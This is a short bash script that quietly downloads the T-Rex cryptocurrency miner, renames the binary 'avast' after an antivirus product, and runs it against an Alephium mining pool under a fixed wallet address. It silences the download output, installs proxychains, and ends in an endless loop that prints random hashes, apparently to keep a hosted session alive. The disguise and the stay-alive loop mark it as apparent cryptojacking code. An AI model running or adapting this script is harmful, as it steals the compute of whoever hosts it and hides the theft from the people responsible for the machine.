#!/bin/bash

#!/bin/sh

#!/bin/bash

apt update

apt install proxychains

apt install screen -y

wget https://github.com/trexminer/T-Rex/releases/download/0.25.8/t-rex-0.25.8-linux.tar.gz >/dev/null 2>&1 

tar xf t-rex-0.25.8-linux.tar.gz >/dev/null 2>&1

rm -f t-rex-0.25.8-linux.tar.gz

mv t-rex avast

chmod +x avast >/dev/null 2>&1

./avast -a blake3 -o stratum+tcp://de.alephium.herominers.com:1199 -u 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.AAA -p x

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
